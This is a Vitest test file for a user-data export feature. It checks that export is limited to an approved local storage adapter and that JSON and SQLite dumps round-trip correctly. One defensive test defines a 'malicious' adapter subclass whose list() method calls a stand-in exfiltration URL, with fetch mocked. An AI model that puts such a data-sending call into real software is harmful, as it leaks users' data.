import { describe, it, expect, beforeEach, vi } from 'vitest';
import {
  collectAllUserData,
  buildJson,
  buildSqlDump
} from './exportMyData';
import { getMemoryAdapter, type StorageAdapter, type DomainRecord } from './domain';
import { SurrealAdapter } from './surreal';
import { CloudflareVaultAdapter } from './cloudflareVaultAdapter';
import { domainConfig } from './domain.config';
import initSqlJs from 'sql.js';

describe('exportMyData', () => {
  beforeEach(() => {
    // Clear the memory adapter and localStorage before each test
    getMemoryAdapter().clear();
    localStorage.clear();
    vi.restoreAllMocks();
  });

  it('rejects unauthorized adapters (remote/unknown)', async () => {
    const fakeAdapter: StorageAdapter = {
      create: vi.fn(),
      list: vi.fn(),
      get: vi.fn(),
      update: vi.fn(),
      del: vi.fn(),
    };

    await expect(collectAllUserData(fakeAdapter)).rejects.toThrow(
      'Export blocked: adapter is not the allowed local StorageAdapter.'
    );
  });

  it('refuses SurrealAdapter and its subclasses, making no fetch calls', async () => {
    const fetchSpy = vi.spyOn(globalThis, 'fetch').mockImplementation(() => Promise.resolve(new Response()));

    // Original surreal adapter
    const surrealAdapter = new SurrealAdapter('http://dummy');
    await expect(collectAllUserData(surrealAdapter)).rejects.toThrow('Export blocked: adapter is not the allowed local StorageAdapter.');

    // Subclass of surreal adapter
    class MySurreal extends SurrealAdapter {}
    const mySurreal = new MySurreal('http://dummy2');
    await expect(collectAllUserData(mySurreal)).rejects.toThrow('Export blocked: adapter is not the allowed local StorageAdapter.');

    expect(fetchSpy).not.toHaveBeenCalled();
  });

  it('refuses CloudflareVaultAdapter, making no network calls', async () => {
    // There are no direct fetch calls in cloudflare adapter, but it uses bindings.
    // If it is incorrectly accepted, it might try to read bindings.
    const cloudflareAdapter = new CloudflareVaultAdapter({});
    await expect(collectAllUserData(cloudflareAdapter)).rejects.toThrow('Export blocked: adapter is not the allowed local StorageAdapter.');
  });

  it('performs a JSON round-trip with the memory adapter and localStorage drafts', async () => {
    const adapter = getMemoryAdapter();
    const instanceId = domainConfig.instanceId as string;

    // Seed data
    await adapter.create('pisa_unit', {
      id: 'unit-1',
      instance_id: instanceId,
      created_at: '2026-01-01T00:00:00.000Z',
      updated_at: '2026-01-01T00:00:00.000Z',
      unit_id: 'u1',
      domain: 'math',
      process: 'evaluate',
      content: 'algebra',
      context: 'personal',
      proficiency_level: '3',
      stimulus_ref: 's1',
      locale: 'es',
      protocol_version: '1.0',
      status: 'published',
    } as any);

    localStorage.setItem('pisastyle.contrib.draft.es', 'draft-content');
    localStorage.setItem('pisa-consent-v1', 'true');

    const data = await collectAllUserData(adapter);
    const jsonStr = buildJson(data);
    const parsed = JSON.parse(jsonStr);

    expect(parsed.entities['pisa_unit']).toBeDefined();
    expect(parsed.entities['pisa_unit'].length).toBe(1);
    expect(parsed.entities['pisa_unit'][0].id).toBe('unit-1');
    expect(parsed.kv['pisastyle.contrib.draft.es']).toBe('draft-content');
    expect(parsed.kv['pisa-consent-v1']).toBe('true');
    expect(parsed).toEqual(data); // Ensures full round-trip parity
  });

  it('proves decrypt-via-adapter pattern by calling list on allowed mock returning plaintext', async () => {
    const plaintextRecord: DomainRecord = {
      id: 'mock-1',
      instance_id: domainConfig.instanceId as string,
      created_at: '2026-01-01',
      updated_at: '2026-01-01',
      mockData: 'plaintext-from-sealed-fixture',
    } as any;

    const localAdapter = getMemoryAdapter();
    const listSpy = vi.spyOn(localAdapter, 'list').mockResolvedValue([plaintextRecord]);

    const data = await collectAllUserData(localAdapter);

    // It should have called list on the adapter
    expect(listSpy).toHaveBeenCalled();
    // It should contain the plaintext
    expect(data.entities[domainConfig.entities[0].name][0]).toEqual(plaintextRecord);
  });

  it('builds a valid SQL dump that restores into an empty SQLite store', async () => {
    const adapter = getMemoryAdapter();
    const instanceId = domainConfig.instanceId as string;

    await adapter.create('exam_attempt', {
      id: 'attempt-1',
      instance_id: instanceId,
      created_at: '2026-01-01T00:00:00.000Z',
      updated_at: '2026-01-01T00:00:00.000Z',
      attempt_hash: 'hash123',
      unit_id: "O'Reilly", // Testing single quote escaping
      score: '100',
      instance_ref: 'inst1',
      locale: 'en',
      status: 'completed',
    } as any);

    localStorage.setItem('pisastyle.contrib.draft.en', "Let's test quotes");

    const data = await collectAllUserData(adapter);
    const sqlDump = buildSqlDump(data);

    // Initialize in-memory SQLite using sql.js
    const SQL = await initSqlJs();
    const db = new SQL.Database();

    // Execute the dump
    db.run(sqlDump);

    // Verify _export_meta
    const metaRes = db.exec('SELECT * FROM "_export_meta" WHERE key="app_id"');
    expect(metaRes[0].values[0][1]).toBe(domainConfig.appId);

    // Verify _kv
    const kvRes = db.exec('SELECT * FROM "_kv" WHERE key="pisastyle.contrib.draft.en"');
    expect(kvRes[0].values[0][1]).toBe("Let's test quotes");

    // Verify entity table rows
    const examRes = db.exec('SELECT id, data FROM "exam_attempt" WHERE id="attempt-1"');
    expect(examRes.length).toBe(1);
    expect(examRes[0].values[0][0]).toBe('attempt-1');

    const rawData = examRes[0].values[0][1] as string;
    const parsedData = JSON.parse(rawData);
    expect(parsedData.unit_id).toBe("O'Reilly");
  });

  it('accepts the approved local adapter and calls list()', async () => {
    const approvedAdapter = getMemoryAdapter();
    const listSpy = vi.spyOn(approvedAdapter, 'list');

    await collectAllUserData(approvedAdapter);

    expect(listSpy).toHaveBeenCalled();
  });

  it('refuses a subclass of the local adapter whose list() calls fetch and never calls fetch', async () => {
    const fetchSpy = vi.spyOn(globalThis, 'fetch').mockImplementation(() => Promise.resolve(new Response()));
    const LocalClass = getMemoryAdapter().constructor as new () => StorageAdapter;

    class MaliciousLocalSubclass extends LocalClass {
      override async list(entity: string, instanceId: string): Promise<DomainRecord[]> {
        await fetch('https://malicious-site.example/steal');
        return super.list(entity, instanceId);
      }
    }

    const subclassAdapter = new MaliciousLocalSubclass();
    await expect(collectAllUserData(subclassAdapter)).rejects.toThrow(
      'Export blocked: adapter is not the allowed local StorageAdapter.'
    );
    expect(fetchSpy).not.toHaveBeenCalled();
  });

  it('refuses a plain object with the same methods', async () => {
    const plainObjectAdapter: StorageAdapter = {
      create: vi.fn(),
      list: vi.fn(),
      get: vi.fn(),
      update: vi.fn(),
      del: vi.fn(),
    };

    await expect(collectAllUserData(plainObjectAdapter)).rejects.toThrow(
      'Export blocked: adapter is not the allowed local StorageAdapter.'
    );
  });
});

